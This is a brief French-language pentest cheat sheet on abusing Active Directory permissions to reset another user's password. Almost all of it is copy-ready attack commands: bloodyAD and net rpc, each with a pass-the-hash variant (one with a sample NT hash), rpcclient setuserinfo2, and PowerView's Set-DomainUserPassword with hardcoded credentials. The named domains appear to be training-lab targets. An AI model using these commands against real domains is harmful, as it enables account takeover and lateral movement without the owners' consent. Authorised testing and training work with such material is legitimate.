
> [!TIP]
> Permet de changer le mot de passe d'un utilisateur

# LINUX

## *BloodyAD*

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```

pass the hash

```sh
bloodyAD --host "192.168.110.55" -d "painters.htb" -u "PNT-SVRBPA$" -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 set password "blake" "P@ssw0rd"
```

## *Net* *rpc*

```bash
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
```

Pass the Hash
```bash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

## *Rpcclient*

```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
```

```bash
setuserinfo2 $TargetUser 23 $NewPassword
```

# WINDOWS

## *PowerView*

S'authentifier avec le compte ayant les droits

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

Créer un nouveau mot de passe pour la target

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Importer PowerView

```powershell
Import-Module .\PowerView.ps1
```

Attribuer le nouveau mot de passe à la target

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

S'authentifier avec la target (Depuis une nouvelle session powershell)

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```



